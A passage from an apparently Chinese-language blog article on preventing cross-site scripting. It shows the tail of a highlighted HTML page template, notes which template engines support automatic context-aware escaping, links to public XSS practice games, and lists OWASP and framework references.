                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Scikit-Learn"</span> <span class="na">title=</span><span class="s">"Scikit-Learn"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    Scikit-Learn
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#术语"</span> <span class="na">title=</span><span class="s">"术语"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    术语
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#领域适应"</span> <span class="na">title=</span><span class="s">"领域适应"</span> <span class="na">rel=</span><span class="s">"12"</span><span class="nt">&gt;</span>
                                    领域适应
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#低资源机器翻译"</span> <span class="na">title=</span><span class="s">"低资源机器翻译"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    低资源机器翻译
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#预训练模型"</span> <span class="na">title=</span><span class="s">"预训练模型"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    预训练模型
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Shell"</span> <span class="na">title=</span><span class="s">"Shell"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    Shell
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#论文投稿"</span> <span class="na">title=</span><span class="s">"论文投稿"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    论文投稿
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#语料库"</span> <span class="na">title=</span><span class="s">"语料库"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    语料库
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#bugs"</span> <span class="na">title=</span><span class="s">"bugs"</span> <span class="na">rel=</span><span class="s">"18"</span><span class="nt">&gt;</span>
                                    bugs
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#饮食"</span> <span class="na">title=</span><span class="s">"饮食"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    饮食
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#数据增强"</span> <span class="na">title=</span><span class="s">"数据增强"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    数据增强
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#LeetCode"</span> <span class="na">title=</span><span class="s">"LeetCode"</span> <span class="na">rel=</span><span class="s">"67"</span><span class="nt">&gt;</span>
                                    LeetCode
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#命名实体识别"</span> <span class="na">title=</span><span class="s">"命名实体识别"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    命名实体识别
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#tensorflow"</span> <span class="na">title=</span><span class="s">"tensorflow"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    tensorflow
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#数据库"</span> <span class="na">title=</span><span class="s">"数据库"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    数据库
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#咨询"</span> <span class="na">title=</span><span class="s">"咨询"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    咨询
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Offer"</span> <span class="na">title=</span><span class="s">"Offer"</span> <span class="na">rel=</span><span class="s">"42"</span><span class="nt">&gt;</span>
                                    Offer
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#LaTeX"</span> <span class="na">title=</span><span class="s">"LaTeX"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    LaTeX
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#前端"</span> <span class="na">title=</span><span class="s">"前端"</span> <span class="na">rel=</span><span class="s">"7"</span><span class="nt">&gt;</span>
                                    前端
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#面试"</span> <span class="na">title=</span><span class="s">"面试"</span> <span class="na">rel=</span><span class="s">"7"</span><span class="nt">&gt;</span>
                                    面试
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
        			<span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/section&gt;</span>
                

                <span class="c">&lt;!-- Friends Blog --&gt;</span>
                
                <span class="nt">&lt;hr&gt;</span>
                <span class="nt">&lt;h5&gt;</span>FRIENDS<span class="nt">&lt;/h5&gt;</span>
                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"list-inline"</span><span class="nt">&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://i.csdn.net/#/uc/profile"</span><span class="nt">&gt;</span>CSDN·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://www.meipai.com/user/1088601139?client_id=1089857299&amp;gid=1119354961&amp;uid=1088601139&amp;utm_user_id=1088601139&amp;utm_content=test&amp;utm_source=meipai_share&amp;utm_term=meipai_ios"</span><span class="nt">&gt;</span>美拍·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://show.gotokeep.com/users/573d84f646054cc85d430037?utm_source=wechat&amp;utm_medium=web&amp;utm_campaign=client_share&amp;utm_term=&amp;utm_content=users"</span><span class="nt">&gt;</span>Keep·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://www.douban.com/people/102650670/"</span><span class="nt">&gt;</span>豆瓣·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                <span class="nt">&lt;/ul&gt;</span>
                
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/article&gt;</span>






<span class="c">&lt;!-- async load function --&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="kd">function</span> <span class="k">async</span><span class="p">(</span><span class="nx">u</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nb">document</span><span class="p">,</span> <span class="nx">t</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">,</span>
          <span class="nx">o</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">t</span><span class="p">),</span>
          <span class="nx">s</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="nx">t</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
      <span class="nx">o</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">u</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span> <span class="nx">o</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="nx">c</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span> <span class="p">},</span> <span class="kc">false</span><span class="p">);</span> <span class="p">}</span>
      <span class="nx">s</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">s</span><span class="p">);</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="c">&lt;!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ --&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="k">async</span><span class="p">(</span><span class="dl">"</span><span class="s2">//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js</span><span class="dl">"</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span>
        <span class="c1">// BY Fix:去除标题前的‘#’ issues:</span><span class="o">&lt;</span><span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/qiubaiying/qiubaiying.github.io/issues/137&gt;</span>
        <span class="c1">// anchors.options = {</span>
        <span class="c1">//   visible: 'always',</span>
        <span class="c1">//   placement: 'right',</span>
        <span class="c1">//   icon: '#'</span>
        <span class="c1">// };</span>
        <span class="nx">anchors</span><span class="p">.</span><span class="nx">add</span><span class="p">().</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.intro-header h1</span><span class="dl">'</span><span class="p">).</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.subheading</span><span class="dl">'</span><span class="p">).</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.sidebar-container h5</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">})</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;style&gt;</span>
    <span class="c">/* place left on bigger screen */</span>
    <span class="k">@media</span> <span class="n">all</span> <span class="n">and</span> <span class="p">(</span><span class="n">min-width</span><span class="p">:</span> <span class="m">800px</span><span class="p">)</span> <span class="p">{</span>
        <span class="nc">.anchorjs-link</span><span class="p">{</span>
            <span class="nl">position</span><span class="p">:</span> <span class="nb">absolute</span><span class="p">;</span>
            <span class="nl">left</span><span class="p">:</span> <span class="m">-0.75em</span><span class="p">;</span>
            <span class="nl">font-size</span><span class="p">:</span> <span class="m">1.1em</span><span class="p">;</span>
            <span class="nl">margin-top</span> <span class="p">:</span> <span class="m">-0.1em</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/a&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>目前已经支持 Automatic Context-Aware Escaping 的模板引擎有：</p>

<ul>
  <li><a href="https://golang.org/pkg/html/template/">go html/template</a></li>
  <li><a href="https://developers.google.com/closure/templates/docs/security">Google Closure Templates</a></li>
</ul>

<h2 id="课后作业xss-攻击小游戏">课后作业：XSS 攻击小游戏</h2>

<p>以下是几个 XSS 攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。</p>

<p>在玩游戏的过程中，请各位读者仔细思考和回顾本文内容，加深对 XSS 攻击的理解。</p>

<p><a href="https://alf.nu/alert1">alert(1) to win</a> <a href="http://prompt.ml/">prompt(1) to win</a> <a href="https://xss-game.appspot.com/">XSS game</a></p>

<h2 id="参考文献">参考文献</h2>

<ul>
  <li>Wikipedia. <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Cross-site scripting</a>, Wikipedia.</li>
  <li>OWASP. <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">XSS (Cross Site Scripting) Prevention Cheat Sheet</a>, OWASP.</li>
  <li>OWASP. <a href="https://github.com/OWASP/owasp-java-encoder/wiki/2">Use the OWASP Java Encoder</a>-Use-the-OWASP-Java-Encoder), GitHub.</li>
  <li>Ahmed Elsobky. <a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Unleashing an Ultimate XSS Polyglot</a>, GitHub.</li>
  <li>Jad S. Boutros. <a href="https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html">Reducing XSS by way of Automatic Context-Aware Escaping in Template Systems</a>, Google Security Blog.</li>
  <li>Vue.js. <a href="https://vuejs.org/v2/api/#v-html">v-html - Vue API docs</a>, Vue.js.</li>
  <li>React. <a href="https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml">dangerouslySetInnerHTML - DOM Elements</a>, React.</li>
</ul>
:ET